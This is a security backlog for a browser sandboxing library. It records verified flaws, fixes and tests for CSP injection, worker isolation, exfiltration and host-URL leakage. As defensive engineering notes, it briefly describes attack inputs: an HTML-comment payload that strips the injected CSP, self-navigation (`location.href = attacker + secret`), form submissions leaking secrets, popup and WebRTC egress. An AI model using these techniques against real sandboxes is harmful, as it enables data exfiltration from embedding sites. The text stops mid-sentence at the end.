# Backlog

The open work on `web-sandbox`, in one place: broken foundations first, then security,
capabilities, parity with existing solutions, and repo hygiene.

Every "current state" line below was verified against the code on 2026-08-29 — commands run,
line numbers checked. Where a document or a README claims something the code does not do, the
gap is filed as an item rather than quietly edited away.

Whether this project should continue at all — rather than adopting an existing solution — is
answered separately in [ADR-001](ADR-001-continue-or-adopt.md). This backlog assumes its
conditional "continue".

**Priority**: P0 blocks everything else · P1 next · P2 planned · P3 opportunistic.
**Effort**: S ≈ hours · M ≈ days · L ≈ week+.

---

## Snapshot

| Area | State |
| :--- | :--- |
| Core isolation (`srcdoc` + opaque origin + immutable CSP) | ✅ implemented, `src/host.ts` |
| CSP generation from typed config | ✅ implemented; `[]` means `'none'` for every directive, never broader than leaving it out (S16), unit-tested per directive |
| Private `MessageChannel` transport | ✅ implemented, iframe + worker |
| Promise-based RPC, both directions | ✅ `src/lib/rpc.ts`, allowlist-only, iframe + worker (B1); every refusal carries a code the other side cannot forge (B7) |
| Worker-mode isolation | ✅ worker spawned inside the sandbox frame (S1) |
| Lifecycle & events | ✅ `state`, `terminate()`, `reset()`, teardown on removal (B2); `sandbox-log` dispatched on the element and bubbling (B3) |
| Execution budget | 🟡 opt-in liveness watchdog in default mode: bounded in worker mode and out-of-process frames, not where the frame shares the host's thread; strict mode open (S6) |
| Unit tests | ✅ `src/**` and `test/unit` run and pass (T2) |
| E2E tests | ✅ e2e + research specs run on a shared harness (T1); files covered on all three engines by `files.spec.ts` (section C) |
| `bun run test` / `bun run build` | ✅ both work from a clean checkout (T3) |
| Type check | ✅ `bun run typecheck` is clean and gates CI (H3) |
| CI | ✅ type check, unit tests, both builds, package smoke test; e2e on Chromium, Firefox, WebKit (D2) |
| CSP delivery | 🟡 `<meta>` only, now always first in `<head>` (S2 fixed); 3 directives discarded (S7); pre-policy egress window (S8) |
| Default policy | ✅ `base-uri` and `form-action` default to `'none'` (S9); an empty directive is `'none'`, and the defaults leave unset fetch directives to `default-src` (S16); no `'self'` in any guest directive, dropped with a warning if configured (S14); `blob:` only with registered files, only for their types' directives ([ADR-004](ADR-004-files-as-blob-urls.md)) |
| Files | 🟡 guest-realm `blob:` URLs through `sandboxFiles` (`list`/`url`/`read`/`text`), both modes, typed by extension, capped at 8 MiB / 1000 files (C1–C3, S3, [ADR-004](ADR-004-files-as-blob-urls.md)); guest markup names files by path (`<script src>`, `<link href>`, media `src`); modules import each other by relative path through one import map (es-module-lexer, bundled); CSS `url()` open (C1), writes open (C5) |
| Host page URL | 🟡 hidden from the guest: base URL `about:blank`, no-referrer frames (S15). The host origin stays visible where engines expose it (`ancestorOrigins`, image `Referer`), and WebKit shows a frame the guest creates the host URL as its referrer (S17) |
| Installable package | 🟡 typed ESM build in `dist/`, packed and smoke-tested in CI; `private: true` until H5's licence is chosen (D1) |

*Updated after the fixes for [issue #6](https://github.com/MentalGear/web-sandbox/issues/6): milestone
M1 plus S1, S2, S9 and the new S10–S12 are done; S14 was added and done on 2026-10-13. On 2026-10-13
the virtual-files Service Worker was replaced by guest-realm blob URLs ([ADR-004](ADR-004-files-as-blob-urls.md)):
S3, C2 and C3 done, C1 partly, C4 rejected, C5 added; C1's markup references and module graph followed the same day.
S15 and S16 were done on 2026-10-13, and S17 added. Rows re-checked against the items below on 2026-10-10. Items marked ✅ below keep their original text as a record of what was wrong.*

---

## T · Broken Foundations

### T1 · The entire e2e suite is dark — ✅ **done**

**Done**: every spec now drives `test/e2e/harness.html` through the `SandboxDriver` fixture in
`test/e2e/fixture.ts`. The playground can move without touching the suite.

Every security claim in `docs/research/` is backed by a spec in `test/e2e/`. None of them runs.

**Verified**: all 15 specs fail. Two mechanical causes, both from the playground move:

1. Specs navigate to `http://localhost:4444/` (e.g. `test/e2e/basic.spec.ts:4`), but Vite's root
   has no `index.html` — the playground is at `/playground/index.html`. Every `page.goto` returns
   `ERR_HTTP_RESPONSE_CODE_FAILURE`.
2. Specs call `setConfig({ scriptUnsafe: true })` without `capabilities`. The default is
   `capabilities: []` (`src/host.ts:38`), so the iframe gets `sandbox=""` — no `allow-scripts`,
   no execution, and every `waitForEvent('console')` times out at 30s.

**Proof the fix is mechanical**: with the URL corrected and `capabilities: ['allow-scripts']`
added, `basic.spec.ts` passes in 2.3s.

**Work**: introduce a shared fixture that owns the page URL and a baseline config, and rewrite
the specs against it, so the next playground move breaks one file instead of fifteen.

**Acceptance**: `bun run test:e2e` runs green; deliberately reverting a mitigation turns the
matching `reproduce.spec.ts` red.

### T2 · `test/unit` never runs, and is red when it does — ✅ **done**

**Done**: vitest includes `test/unit`; the test imports `ALLOWED_CAPABILITIES` from
`@src/csp-directives`, its real home, so no new public export was added to `host.ts`.

**Verified**: `test:unit` is `bun vitest --dir src`, so `test/unit/host.test.ts` is silently
excluded. Run it directly and both cases fail: it imports `ALLOWED_CAPABILITIES` from `@src/host`,
but `host.ts` only *imports* that symbol from `./csp-directives` (`src/host.ts:2`) and never
re-exports it, so the value is `undefined`.

This is the deny-list test that guards findings 01, 02 and 05 — the ones that all root-cause to
`allow-same-origin`. It has been asserting nothing.

**Work**: widen the vitest scope to include `test/unit`, and either re-export the constant from
`host.ts` or import it from `@src/csp-directives`. Decide deliberately, since it is public API.

**Acceptance**: `bun run test:unit` collects both directories and is green; deleting the filter
in `setConfig()` (`src/host.ts:70`) turns it red.

### T3 · `bun test` and `bun run build` fail on stale paths — ✅ **done**

**Done**: `bun run test` runs unit then e2e (`bun test` without `run` is Bun's own runner, so the
README now says `bun run test`); Playwright starts Vite itself; `vite build` targets the playground;
`build.ts` no longer copies the removed demo page.

**Verified**, four dead paths:

| Path | Referenced from | Reality |
| :--- | :--- | :--- |
| `research/playwright.config.ts` | `package.json` `test:e2e` | no `research/` dir; config is at repo root |
| `bun vendor/web-sandbox/index.ts` | `playwright.config.ts:30` `webServer.command` | no `vendor/` dir |
| `http://localhost:4444` | `playwright.config.ts:31` `webServer.url` | 404s; the served page is `/playground/index.html` |
| `playground/virtual-files-demo.html` | `build.ts:38` | replaced by `playground/index.html` |

**Work**: point `test:e2e` at the root config, set `webServer.command` to `bun run dev` and
`webServer.url` to the playground, and fix `build.ts`. Note `playwright.config.ts` uses
`testDir: "test"`, which also sweeps up the vitest file from T2 — scope it to `test/e2e`.

**Acceptance**: `bun test` runs unit **and** e2e from a clean checkout; `bun run build` completes.

### T4 · Presets are not wired into the tests — **P1 · M**

The README's stated USP is *"Use the same Preset definitions for both manual testing (Playground)
and automated regression testing"*.

**Verified**: `src/lib/presets.ts` defines 18 presets covering findings 01–10 — and
`playground/playground.ts` is the only file that imports it. No test references presets; the
specs hard-code their payloads. The unification is documented but not built.

**Work**: drive the e2e regression specs from `PRESETS`, so a new attack vector is added once.

**Acceptance**: each `reproduce.spec.ts` sources its payload and rules from a preset id; adding a
preset without a spec fails a coverage assertion.

### T5 · Egress specs rely on request routing that can miss guest requests — **P1 · S**

**Guarantee**: every "nothing left the sandbox" assertion rests on evidence that cannot silently
miss a request.

**Verified** (2026-10-13, during the [blob delivery probe](research/blob-delivery-probe.md)): in
Chromium, Playwright's `context.route` saw the guest frame's subresource requests only
intermittently (1 run in 4, unless the host page made a request first). A spec whose only evidence is
"the route recorded no request" can therefore pass while a request went out.

**Work**: audit the egress specs (`security`, `hard-security`, `worker-security`, the research
specs) and back every route-only check with evidence that cannot be missed: a CSP violation event
from inside the guest, the guest's own load/error outcome, and where it matters a listener outside
the browser (as the probe's raw TCP listener did). Keep routing as secondary evidence.

**Acceptance**: no egress spec passes on route silence alone; a deliberately permitted request is
observed by every evidence channel the spec uses (a positive control), in all three engines.

New egress specs follow this already: section 4 of `test/e2e/files.spec.ts` requires, for every
attempt, both a refused load outcome and the matching CSP violation, with a permitted load as the
outcome channel's positive control and routing only as secondary evidence. Its section 8 does the
same for markup references that must not resolve: no violation is possible there (the URL never
resolves), so a refused absolute URL in the same document is the violation channel's positive
control, and a matched reference the outcome channel's.

---

## S · Security & Correctness

### S1 · Worker mode escapes the sandbox CSP — ✅ **done**

**Done**: worker mode now creates the sandbox frame too, and a bootstrap inside it spawns the worker
(`src/lib/worker-bootstrap.ts`), so the worker inherits the opaque origin and the sandbox CSP. A
timeout recreates the frame, which terminates the worker. `test/e2e/worker-security.spec.ts`.

**Verified**: `spawnWorker()` builds a `blob:` URL and calls `new Worker()` on the *host* document
(`src/host.ts:206–210`), so the worker inherits the host origin and host CSP — not the sandbox
policy. `initialize()` skips iframe creation entirely in worker mode (`src/host.ts:195`). The code
says so at `src/host.ts:196`:

> `// TODO: this is wrong! we need to place the worker inside the iframe, oterwise the worker has full network access (has host CSP policy)`

`COMPETITOR_ANALYSIS_2.md` lists headless mode as a differentiator, and
`test/e2e/worker-security.spec.ts` claims to assert it — but per T1 that spec has never run.

**Work**: always create the iframe; spawn the worker from inside it so it inherits the opaque
origin and injected CSP; route the `MessagePort` handshake through the frame.

**Acceptance**: worker-mode `fetch` to a domain absent from `connectionsAllowed` is blocked, and
`importScripts` of an external URL fails — asserted in a *running* spec.

### S2 · User markup can delete the injected CSP — ✅ **done**

**Done**: the security block is prepended before any user content instead of spliced into it
(`buildGuestDocument()` in `src/lib/frame-documents.ts`). The parser ignores the user's later
doctype and `<head>` and merges `<html>`, so the CSP meta is always the first parsed `<head>` child.
Asserted against a hostile corpus in `frame-documents.test.ts` and in-browser by research 11.3.

*Raised from P1 after [Research 11.3](research/11_meta_csp_delivery/README.md) reproduced it.*

**Verified**: `createIframe()` inserts the `<meta>` CSP by string-replacing `<head>` or the
`<html…>` tag (`src/host.ts:267–271`), guarded only by `unsafeContent.toLowerCase().includes('<html')`.
Two of the repo's own TODOs sit on those lines (`src/host.ts:261`, `:265`):

> `// TODO: is this secure enough for user provided content? Could user-content contain some trick to avoid having this inserted?`

**Reproduced**: `String.replace` with a non-global regex replaces the *first* textual match
anywhere in the string, with no notion of document structure. The payload
`<html><body><!-- <head> -->…` captures the injection inside an HTML comment, and the sandbox
reports `document.querySelector('meta[http-equiv="Content-Security-Policy"]') === null` — the
document runs with **no CSP at all**. The security block, `<base>` tag and comms script all
vanish with it.

Isolation held in that test, but via the opaque origin (the fetch failed on CORS, not CSP). With
the policy gone, `connect-src` allowlisting is gone: `no-cors` beacons, `sendBeacon`, form posts
and `<a ping>` remain reachable, and the request URL is the exfiltration channel.

Related: a policy that lands outside the *parsed* `<head>` is dropped entirely, not partially
(Research 11.2) — so being textually first is not sufficient.

**Work**: replace regex splicing with a parse-then-serialize step, or prepend the security block
before any user content and assert the parsed result. Fuzz it against hostile inputs.

**Acceptance**: `docs/research/11_meta_csp_delivery/reproduce.spec.ts` §11.3 passes (it is written
to fail against today's code), and the meta is asserted to be the first *parsed* head child across
a corpus of malformed and hostile documents.

### S3 · The session id is readable by sandboxed code — ✅ **done**

**Done** ([ADR-004](ADR-004-files-as-blob-urls.md)): there is no session id any more. Files reach the
guest as `blob:` URLs minted in its own realm, which neither another sandbox nor the host page can
load, and the guest document carries no host identifier and no `<base>`. Tests: section 3 of
`test/e2e/files.spec.ts` (a second sandbox handed the first one's URL gets a network error and
`NOT_FOUND` by name; the host page cannot load it either; each lists only its own files) and
`test/unit/files.test.ts`.

**Verified**: with virtual files enabled, the session UUID is embedded in the `<base href>`
(`src/host.ts:228`, `:257`). `sw.ts` treats that id as a capability token — *"possession of the
URL implies access rights"* (`src/virtual-files/sw.ts:44-46`) — but the sandbox can read its own
`<base>` and exfiltrate it wherever CSP permits. The TODO at `src/host.ts:227` asks the same
question.

**Work**: either stop treating the id as a secret and add an origin/mode check in the SW fetch
handler, or rotate per load and keep the mapping host-side. Document which model is in force.

**Acceptance**: a spec showing another sandbox instance cannot read the first instance's files
even when handed its session id.
If the Service Worker is replaced by blob-URL files, this guarantee moves to C1's containment
acceptance rather than disappearing with it.

### S4 · `scriptUnsafe` has no guard rail — ✅ **done**

**Guarantee**: an instance that enables `scriptUnsafe` says so on the console exactly once, naming the
risk: guest code can run strings as code.

**Done**: `setConfig()` warns once per instance when `scriptUnsafe` is on (`_warnAboutScriptUnsafe` in
`src/host.ts`), however often `reset()`, `load()` or `setConfig()` rebuild the environment; only a
literal `true` enables it, since the value is also interpolated into the guest bootstrap. The README
states that it exists for testing. Tests:
- unit: `test/unit/host.test.ts` (one warning across `setConfig()`, `reset()`, `load()`, a mode switch
  and an off/on toggle; one more for a second instance; none, and no `'unsafe-eval'`, for any value
  other than `true`);
- e2e: section S4 of `test/e2e/guard-rails.spec.ts` (one warning across reset and setConfig in both
  modes, the guest's `eval` runs with it on and is refused with an `EvalError` without it).

**Verified**: `scriptUnsafe: true` appends `'unsafe-eval'` to `script-src` (`src/host.ts:246`)
with no warning at any level; the TODO at `src/host.ts:9` asks for one. It is enabled in most
presets and in every e2e spec, so it is the path of least resistance for a copy-paste consumer.

**Work**: a one-time console warning when enabled, and a prominent README note that it exists for
testing. **Acceptance**: enabling it emits exactly one warning per instance.

### S5 · No CSP violation reporting — **P2 · M**

`test/e2e/security.spec.ts:29` records the gap in a comment: *"web-sandbox doesn't have CSP
violation reporting hooked up to postMessage yet"*. Tests must therefore assert the *absence* of a
success log with a 2s timeout — slow and prone to false green.

**Work**: listen for `securitypolicyviolation` inside the sandbox and forward it over the port as
a first-class event. **Acceptance**: a blocked request produces an observable `violation` event on
the host, and the security specs assert on it directly.

### S6 · No execution budget in iframe mode — 🟡 **default-mode watchdog done; strict mode open**

**Done (default mode)**: an opt-in liveness watchdog, `watchdogTimeout` (ms, off by default). The
host pings the guest over the port and the guest bootstrap answers outside the broker; a guest
silent for the whole budget is terminated (reason `the guest stopped responding (watchdog)`),
between one and 1.25 budgets after its last answer. Mechanism in `src/lib/watchdog.ts`, decision in
[ADR-003](ADR-003-lifecycle-and-liveness.md). What holds, verified 2026-10-11: case 1 (worker mode)
on every browser, since the port is handed to the worker and a looping worker stops answering; case 2
wherever the browser runs the frame out of process. Which case iframe mode lands in is browser policy
and varies by environment: headless Chromium ran the frame out of process in one environment and on
the host's thread in CI; WebKit ran it on the host's thread. Case 3 stays a platform limit, stated in
the README. Tests: `test/e2e/watchdog.spec.ts` (iframe mode measures the process model at runtime on
every browser, then asserts the endless-loop bound out of process or that host stalls are not charged
to the guest on a shared thread; worker loop, no false positives across a reset, and stop on
removal/termination on every browser) and `src/lib/watchdog.test.ts` (timing).
**Still open**: strict mode, and the memory and inbound-traffic note under *Open* below.

**Guarantee**: untrusted code can never keep the host page busy indefinitely; the host can always
stop the guest within a bounded time.

**Verified**: the only budget is `workerExecutionTimeout`. `execute()` arms it through
`_startTimeout()` (`src/host.ts`), which sets a timer only when `mode === 'worker'`; iframe mode has
none. It is opt-in (default `0`), and nothing reports completion, so it recreates the frame even
after code that finished. Background: [`RESOURCE_QUOTAS.md`](research/RESOURCE_QUOTAS.md).

**What each mode provides**:

1. **Worker mode — holds today, by construction.** Guest logic runs on its own thread and never
   blocks the host's. On expiry the host recreates the frame (`initialize()`), which terminates the
   worker. Shipped; asserted by `test/e2e/worker-timeout.spec.ts`.
2. **Iframe mode, frame in its own process** (browser policy: Chromium often isolates opaque-origin
   sandboxed frames this way, but not in every environment). A guest loop blocks only the guest's process and the host stays responsive, so
   a host-side heartbeat watchdog can remove the frame. Holds once that watchdog exists; it pairs
   with B2's lifecycle owner.
3. **Iframe mode, frame on the host's thread** (platforms without that isolation). A guest loop
   stops all script on that thread, the watchdog included. No in-page mechanism can bound this: it
   is a platform limit, stated as such. Strict mode, below, avoids it.

**Design — separate execution from rendering**, as an opt-in **strict mode**. Guest logic runs in
a worker; the DOM frame carries no guest script (its CSP admits none) and only renders updates the
host applies over the broker (B1). A frame with no guest script cannot loop, and a worker that
loops can always be stopped, so bounded execution no longer depends on the browser's process model.
Keeping guest code out of the frame also strengthens the self-navigation guarantee (S10) and the
guarantees about what guest code can reach from its global scope: `eval` only when explicitly
enabled (S4), and no WebRTC (S13). The cost is a different programming model (no inline guest
`<script>`; UI updates are declarative messages), which is why it is opt-in.

**Default iframe mode** keeps guest script and gets the watchdog: bounded wherever the browser
isolates the frame (case 2), with case 3's limit documented.

**Depends on**: the broker (B1) to carry render updates from worker to frame; B2 for watchdog and lifecycle.

**Open**: this bounds time, not memory; nothing caps allocation in either mode. Sampling
`performance.measureUserAgentSpecificMemory()` where available remains a follow-up. Likewise the
host does not cap inbound traffic: a guest that floods it with calls or log lines costs host time.
That belongs to the same watchdog, not to a per-channel cap, since an RPC limit alone would leave
`console.log` in a loop unbounded.

**Acceptance**: in strict mode, an unbounded loop in guest logic is stopped within the configured
budget on Chromium, Firefox and WebKit (CI); in default mode, the watchdog stops it where the frame
runs in its own process, and the README states the same-thread limit plainly.

---

### S7 · Silently ignored CSP directives — **P1 · S**

*From [Research 11.1](research/11_meta_csp_delivery/README.md).*

**Verified**: a `<meta>`-delivered policy discards `frame-ancestors`, `report-uri`/`report-to` and
`sandbox` — Chromium logs *"is ignored when delivered via a `<meta>` element"* for each.
`CSPDirectives` exposes `frame-ancestors` (`src/csp-directives.ts`) and `generateCSP()` emits it
whenever a consumer supplies a non-empty array. Nothing warns them, so a consumer who sets it
believes they restricted embedding and has configured nothing. The shipped default passes `[]`,
which is dropped as empty, so only the public config surface is affected.

**Work**: reject or warn on these four directives in `generateCSP()` under meta delivery; move
embedding control to the host element. Note this also rules out `report-uri`/`report-to`, leaving
the in-sandbox `securitypolicyviolation` event (S5) as the only reporting route.

**Acceptance**: setting `frame-ancestors` raises a warning (or throws) rather than emitting a
directive the browser discards.

*Update (2026-10-13, S16)*: the shipped default no longer lists `frame-ancestors`, and an explicit `[]`
is now emitted as `frame-ancestors 'none'`, which a `<meta>` policy discards like any other value.

### S8 · Pre-policy egress window — **P3 · accepted risk**

*From [Research 11.4](research/11_meta_csp_delivery/README.md).*

**Verified**: in 1 of 5 runs a request reached the network from the transient `about:blank`
document, before the meta policy took effect. It is racy and **branch-independent** — it appeared
on the well-formed document, which takes the safest injection path. The CSP violation was still
logged, so the resource was blocked from *use*; the request itself still left, which is sufficient
for exfiltration where the URL is the payload.

**No mitigation exists under `<meta>` delivery** — the window is inherent to the mechanism. It
closes only under header delivery, where the policy arrives with the response carrying the content.
Tracked as a known limitation; see [ADR-001](ADR-001-continue-or-adopt.md).

### S9 · `base-uri` and `form-action` are silently unrestricted — ✅ **done**

**Done**: `generateCSP()` emits `'none'` for an empty directive listed in `NON_FALLBACK_DIRECTIVES`
(`base-uri`, `form-action`). `frame-ancestors` is left out on purpose: browsers ignore it under
`<meta>` delivery (S7). Research 12 passes.
**Tightened** (2026-10-13, [ADR-004](ADR-004-files-as-blob-urls.md)): `base-uri` no longer gains a
virtual-files base, so with the default config it is always `'none'`; the guest document has no `<base>`.
**Generalised** (2026-10-13, S16): every empty directive is emitted as `'none'`, so the
`NON_FALLBACK_DIRECTIVES` special case is gone.

*From [Research 12](research/12_non_fallback_directives/README.md).*

**Verified**: `generateCSP()` omits empty-array directives, documented as *"Empty arrays are
omitted to allow `default-src` fallback"* (`src/lib/csp/csp-generator.ts:3-5`). That reasoning
holds for fetch directives but **not** for `base-uri` or `form-action`, which have no fallback.
The shipped default sets both to `[]`, so the emitted policy is:

```
default-src 'none'; upgrade-insecure-requests; script-src 'self' 'unsafe-inline';
style-src 'unsafe-inline'; worker-src blob: data:;
```

— with no `base-uri` and no `form-action`, i.e. **both unrestricted**.

**Exploited**: with `capabilities: ['allow-scripts', 'allow-forms']` (both sanctioned values in
`ALLOWED_CAPABILITIES`) and the default `connectionsAllowed`, a `GET` form submitted to a
non-allowlisted target reached the network as `…?stolen=session-secret`, **with no CSP violation
logged**. A form is a complete exfiltration primitive: no `fetch`, no `connect-src`, no bridge.

`base-uri` is the mitigation [finding 10](research/10_base_tag_hijacking/README.md) recommended
for itself and never got — and it matters more than that finding knew, since the VFS routes assets
through an injected `<base href>` (`src/host.ts:257`).

**Work**: teach `generateCSP()` which directives fall back and which do not; emit `'none'` for an
empty non-fallback directive instead of omitting it. Default `base-uri` to `'self'` and
`form-action` to `'none'`. Document that `[]` means *deny* in this config surface.

**Acceptance**: `docs/research/12_non_fallback_directives/reproduce.spec.ts` passes (both cases are
written to fail against today's code).

### S10 · The guest frame can navigate itself to carry data out — ✅ **done**

*From [issue #6](https://github.com/MentalGear/web-sandbox/issues/6) (N1) and
[Research 14](research/14_self_navigation/README.md).*

**Verified**: with only `allow-scripts`, `location.href = attacker + secret` sent the secret in the
request URL. Sandbox flags stop top-level navigation, not self-navigation, and no CSP directive
governs it.

**Done**: the guest frame sits inside a library-owned wrapper frame whose policy is
`frame-src 'none'`. The embedder's `frame-src` is checked on every navigation of a child frame,
including ones the child starts, before the request is sent. Research 14.1 covers script, link,
`window.open(…, '_self')` and meta refresh.

Confirmed in Chromium, Firefox and WebKit (CI).

### S11 · A fresh port is handed to whatever document loads next — ✅ **done**

*From issue #6 (N2).*

**Verified**: `onload` called `setupChannel()` on every load, posting a new `MessagePort` (and queued
`execute()` code) to `'*'`. After S10 the attacker's page received a live channel.

**Done**: the channel is set up exactly once per frame. A second load closes the port, drops the
queue, removes the frame and fires `terminated`; `execute()` is refused until the next
`setConfig()` / `load()`. Research 14.2.

### S12 · Risky capabilities are on the allow-list — ✅ **done**

*From issue #6 (N3) and [Research 13](research/13_popup_exfiltration/README.md).*

**Verified**: `ALLOWED_CAPABILITIES` included `allow-popups` (URL exfiltration through a new
top-level window, which neither CSP nor the wrapper's `frame-src` covers), `allow-modals`,
`allow-downloads` and `allow-presentation`.

**Done**: split into `SAFE_CAPABILITIES` (`allow-scripts`, `allow-forms`, `allow-pointer-lock`,
`allow-orientation-lock`) and `UNSAFE_CAPABILITIES` (popups, modals, downloads, presentation). Unsafe
ones are dropped from `capabilities` with a warning and accepted only through `unsafeCapabilities`,
which warns once per capability per instance. `allow-forms` stays safe: `form-action` defaults to
`'none'` (S9) and a form submission is a navigation the wrapper blocks (S10).

### S13 · No WebRTC egress guarantee — **P1 · S** — candidate

**Guarantee**: guest code cannot reach the network through WebRTC.

**Observed**: in one headless-Chromium run, `RTCPeerConnection` was available in the guest, and its
ICE traffic is not governed by `connect-src`; adding the experimental `webrtc 'block'` directive did
not change that. Treat this as a candidate until it is confirmed on Firefox and WebKit.

**Work**: remove `RTCPeerConnection` (and `webkitRTCPeerConnection`) from the guest's global scope
in the bootstrap, before any guest code runs, and offer WebRTC only as an explicit unsafe
capability. The removal must also hold in frames the guest creates: `frame-src 'none'` stops frames
that load a URL, but a `srcdoc` frame still loads (research 01 relies on this) and has a global
scope of its own, where a Chromium check still found the constructor after it had been removed from
the guest. Covering those frames, or ruling out script in them as strict mode (S6) does, is part of
this item and may make it larger than S.

**Acceptance**: by default, in iframe mode, `typeof RTCPeerConnection === 'undefined'` in the guest
and in any frame it creates, on Chromium, Firefox and WebKit (CI).

### S14 · **script-src 'self'** admits other origins in the guest — ✅ **done**

*From the [blob-delivery probe](research/blob-delivery-probe.md).*

**Verified** (2026-10-13, Playwright 1.58.1 builds: Chromium 141, Firefox 146, WebKit 26.0 on Linux):
the default guest policy was `script-src 'self' 'unsafe-inline'`. The guest's origin is opaque, and
the engines disagreed on what `'self'` matched there:
- **WebKit** admitted any https origin. With the shipping config (`scriptUnsafe: false`), a classic
  script, a module script and `import()` from a non-allowlisted origin loaded and ran, with no
  violation. A raw TCP listener received the connection. This was an egress route in the default
  config.
- **Chromium** resolved `'self'` to the host page's origin, so the guest could load scripts from the
  host's server.
- **Firefox** matched nothing.

To re-measure in Safari proper: Playwright's WebKit on Linux is not Safari.

**Work**: remove `'self'` from the default `script-src` and the playground presets. Drop it from every
directive a config supplies, at the one place each guest policy is built. Warn once per directive per
instance. A directive emptied by the drop becomes `'none'` rather than falling back to `default-src`.

**Acceptance**: no guest policy contains `'self'`, in either mode. With the shipping default, no engine
loads a script from another origin or from the host origin. A configured `'self'` is dropped with a
warning and changes nothing, identically on Chromium, Firefox and WebKit.

**Done**: `dropSelfSources()` (`src/lib/csp/drop-self.ts`) is applied last in `_getCSP`
(`src/host.ts`), the one builder of the guest policy (worker mode inherits it). The default
`script-src` is `'unsafe-inline'`. Tests:
- unit: `src/lib/csp/drop-self.test.ts` and `test/unit/host.test.ts` (iframe and worker mode, across
  `reset()`);
- e2e: section 5a of `test/e2e/blob-delivery.spec.ts` (iframe, plus worker-mode `importScripts` and
  `import()`).

### S15 · The guest can read the host page's URL — ✅ **done** (platform limits below; WebKit residual in S17)

**Guarantee**: nothing in the guest's own document or location reveals the host page's URL or origin.

**Verified** (2026-10-13, Playwright 1.58.1 builds: Chromium 141, Firefox 146, WebKit 26.0 on Linux;
iframe mode, default config, guest code run through `execute()`; throwaway probe, not kept):

| Exposed in the guest | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| `document.baseURI` | **full host page URL** | **full host page URL** | **full host page URL** |
| `document.referrer` | empty | empty | **host origin** (`http://localhost:4444/`) |
| `location.ancestorOrigins` | **`["null", host origin]`** | not implemented | **`["null", host origin]`** |
| `location.href` | `about:srcdoc` | `about:srcdoc` | `about:srcdoc` |

A `srcdoc` document takes its base URL from the document that embeds it, so the guest inherits the
wrapper's, which inherits the host page's: path, query and fragment included, so a token in the host
URL is readable by guest code. `ancestorOrigins` lists the wrapper (`null`) and the host's origin.
In worker mode the worker's own `location` is its `blob:null/…` URL and none of the three exists, so
the exposure is iframe mode only.

**Work** (proposal, not built): give the wrapper document a fixed, inert base URL — a `<base href>` in
the wrapper, which its own policy must allow, since the wrapper's CSP is `frame-src 'none'` only — so
the guest inherits that instead of the host's. Set a no-referrer policy on both frames
(`referrerpolicy="no-referrer"` and a `<meta name="referrer">`). `ancestorOrigins` cannot be set by
the page; check whether the referrer policy changes it in Chromium and WebKit, and document what
remains if it does not.

**Acceptance**: in all three engines, the guest's `document.baseURI`, `document.referrer` and
`location.ancestorOrigins` reveal nothing of the host page URL; `base-uri` stays `'none'` in the guest
policy.

**Done**: the wrapper document (`buildWrapperDocument`, `src/lib/frame-documents.ts`) carries
`<base href="about:blank">` and `<meta name="referrer" content="no-referrer">` in its `<head>`, and both
iframes carry `referrerpolicy="no-referrer"`. The guest inherits the base and the referrer policy; its
own `<base>` is still refused by `base-uri 'none'`. `about:blank` was chosen over an
`https://….invalid` base because nothing resolves against it: a relative URL in guest markup sends no
request at all, where an `.invalid` base turned it into a request that only the policy stopped.
Absolute URLs (files, workers, allowlisted origins) are unaffected, and the S10/S11 frame checks and
the file tests pass unchanged. Tests:
- e2e: `test/e2e/host-url.spec.ts`, on a host page URL with a distinctive query and fragment; Referer
  is recorded by a local HTTPS server that every expected request must reach;
- unit: `src/lib/frame-documents.test.ts` and `test/unit/host.test.ts` (iframe and worker mode).

Measured 2026-10-13 (same builds as above), before → after; "host URL" includes path and query:

| Exposed to the guest | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| `document.baseURI`, `import.meta.url`, relative `href`s | full host URL → `about:blank` | full host URL → `about:blank` | full host URL → `about:blank` |
| relative URL in markup (`<img src="x.png">`) | resolved against the host URL, refused by CSP → never resolved, no request | same | same |
| `document.referrer`, violation event `referrer` | empty | empty | host origin, or host URL if the host page's policy is `unsafe-url` → empty |
| `Referer` on guest image requests, by default | none | host origin → none | host origin → none |
| `Referer` when the guest asks for `unsafe-url` | none | host origin (limit) | host origin (limit) |
| `Referer` on `fetch()`, any policy | none | none | none |
| `location.ancestorOrigins` | `["null", host origin]` (limit) | not implemented | `["null", host origin]` (limit) |
| a frame the guest creates: `document.referrer` | empty | empty | host URL without fragment (S17) |
| worker: `location`, `Referer` | own `blob:null/…`, none | same | same |

**Platform limits**, asserted per engine by the tests:
- `location.ancestorOrigins` lists the host origin in Chromium and WebKit. A page cannot change it, and
  `referrerpolicy="no-referrer"` does not mask it in either engine.
- Firefox and WebKit send the host origin as `Referer` on image requests whenever the policy in force
  allows one. By default it does not; the guest can ask for one per request or with its own
  `<meta name="referrer">`, and no document can prevent that. Path and query never appear.
- WebKit gives a frame the guest creates the host page URL, minus fragment, as `document.referrer`
  (S17). That is the full path and query, so the guarantee does not hold in WebKit until S17 is done.

### S16 · An empty directive array can widen the policy — ✅ **done**

**Guarantee**: no configuration can make the emitted policy broader than the same configuration with
that directive left out.

**Verified** (2026-10-13): `generateCSP({ 'default-src': [], 'script-src': ["'unsafe-inline'"] })`
returns `script-src 'unsafe-inline';` — no `default-src` at all. `generateCSP()` puts its
`default-src 'none'` first and spreads the config over it, so an empty array replaces it, and an empty
fetch directive is omitted. `connectionsAllowed: { 'default-src': [] }` therefore leaves every fetch
directive that is not set explicitly unrestricted. Omitting `default-src` from the config keeps the
default `'none'`, so `[]` — which the config surface documents as "deny" — is broader than leaving it
out.

**Work**: by construction, an empty array for any directive emits `'none'`, never an omission, so
"empty" can only ever mean deny. Unit tests over every directive in `CSPDirectives`.

**Acceptance**: for every directive, the policy from a config with that directive set to `[]` is no
broader than from the same config without it; `default-src: []` emits `default-src 'none'`.

**Done**: `generateCSP()` (`src/lib/csp/csp-generator.ts`) emits `'none'` for any directive whose
array is empty after blank strings are dropped; nothing is omitted any more. `upgrade-insecure-requests`
is emitted whenever its key is present, and a non-array value still throws. Interactions:
- the shipping default no longer lists empty fetch directives (`connect-src: []` …), which would now pin
  each to `'none'` and cut it off from an embedder's `default-src`; its emitted policy is unchanged;
- `dropSelfSources()` leaves a directive it emptied as `[]` and the generator makes it `'none'`;
- `addFileSources()` treats `[]` like `'none'` (kept, with a warning), so registering a file never
  widens a denied directive to `default-src`'s sources; an empty `default-src` gives files `blob:` only.

Tests:
- unit: `src/lib/csp/csp-generator.test.ts` — every directive of `CSPDirectives` (a type check fails if
  one is missing), `{ 'default-src': [] }` with a `script-src`, and a property check over every
